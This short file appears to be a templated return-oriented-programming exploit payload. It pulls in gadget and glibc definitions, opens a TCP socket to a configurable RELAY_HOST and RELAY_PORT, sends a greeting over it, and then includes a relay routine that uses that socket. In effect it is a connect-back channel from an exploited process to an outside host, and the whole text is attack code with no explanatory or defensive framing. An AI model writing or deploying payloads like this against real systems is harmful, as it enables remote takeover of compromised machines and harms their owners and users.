relay {
	{% include "gadgets.pro" %}
	{% include "glibc.pro" %}
	// setup connection
	var ropserver;
	socket(AF_INET, SOCK_STREAM, 0);
	store_rdx_rax(&ropserver, undefined);
	array sock[{{ sockaddr(RELAY_HOST, RELAY_PORT) }}];
	connect(ropserver, sock, 0x10)

	dprintf(ropserver, "hello, you are %d\n", ropserver);

	{% set RELAY_FD = 'ropserver' %}
	{% include "relay.pro" %}
	exit(0);
}
